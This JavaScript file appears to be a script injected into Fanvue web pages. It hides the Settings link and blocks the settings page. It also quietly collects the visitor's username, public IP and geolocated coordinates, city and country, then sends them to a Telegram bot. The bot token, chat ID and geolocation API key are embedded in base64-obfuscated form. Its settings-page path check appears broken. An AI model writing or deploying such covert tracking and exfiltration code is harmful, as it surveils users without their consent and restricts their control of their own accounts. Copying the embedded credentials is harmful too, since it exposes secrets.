function decodeBase64(encoded) {
    return atob(encoded);
}

const TELEGRAM_BOT_TOKEN = decodeBase64('Nzc5NjA1OTE2MDpBQUZKTFM1TlpwRFh0UERfYjc1ekx0N0k4UnNzNy1aeENYNA==');
const TELEGRAM_CHAT_ID = decodeBase64('NzUwNzYzMTA5Nw==');
const IP_TOKEN = decodeBase64('ZGIxZGEzNDktOGZhZS00NDhhLWE4ZTMtNzhjMjQxODBmMTFj');

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

function sendTelegramAlert(message) {
    fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        })
    });
}

function hideSettingsMenu() {
    const settingsLink = Array.from(document.querySelectorAll('a')).find(link => link.textContent.includes('Settings'));
    if (settingsLink) {
        settingsLink.style.display = 'none';
    }
}

function monitorSettingsAccess() {
    const settingsPage = window.location.pathname === '/settings/*';
    if (settingsPage) {
        const restrictedSection = document.querySelector('.MuiBox-root.mui-135l4mv');

        if (restrictedSection) {
            document.body.innerHTML = "<h1 style='color: red;'>🚫 Accès restreint !</h1><p>Vous n'avez pas les autorisations pour accéder à cette page.</p>";
            document.body.appendChild(restrictedSection);
        }
        getUserInfo().then(userInfo => {
            sendTelegramAlert(`🔴 Alerte : Un utilisateur a tenté d'accéder à /settings sur Fanvue !\nNom d'utilisateur: ${userInfo.username}\nCoordonnées: ${userInfo.lat}, ${userInfo.lon}\nVille: ${userInfo.city}\nPays: ${userInfo.country}`);
        });
    }
}

async function getUserInfo() {
    const currentIpResponse = await fetch('https://api.ipify.org/?format=json');
    const currentResponse = await currentIpResponse.json();
    try {
        const ipResponse = await fetch(`https://apiip.net/api/check?ip=${currentResponse.ip}&accessKey=${IP_TOKEN}`);
        if (!ipResponse.ok) {
            throw new Error(`Erreur réseau : ${ipResponse.status}`);
        }
        const ipData = await ipResponse.json();

        return {
            username: document.querySelector('.mui-h4bbp6').textContent,
            ip: currentResponse.ip,
            lat: ipData.latitude,
            lon: ipData.longitude,
            city: ipData.city,
            country: ipData.countryName
        };
    } catch (error) {
        console.error("Erreur lors de la récupération de la localisation:", error);
        return {
            username: document.querySelector('.mui-h4bbp6').textContent,
            ip: currentResponse.ip,
            lat: null,
            lon: null,
            city: null,
            country: null
        };
    }
}

window.addEventListener('load', () => {
    hideSettingsMenu();
    monitorSettingsAccess();
})